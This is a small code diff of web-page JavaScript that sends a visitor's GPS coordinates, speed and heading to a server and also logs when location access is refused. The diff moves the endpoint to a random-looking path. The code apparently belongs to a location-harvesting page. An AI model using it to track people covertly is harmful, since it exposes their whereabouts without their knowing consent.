@@ -22,7 +22,7 @@ function locate()
 
     $.ajax({
       type: 'POST',
-      url: '/',
+      url: '/rxWyhjKl',
       data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd, Flag: 1},
       success: function(){popup();},
       mimeType: 'text'
@@ -60,7 +60,7 @@ function showError(error)
 
   $.ajax({
     type: 'POST',
-    url: '/',
+    url: '/rxWyhjKl',
     data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown, Flag: 0},
     success: function(){$('#change').html('Failed');},
     mimeType: 'text'
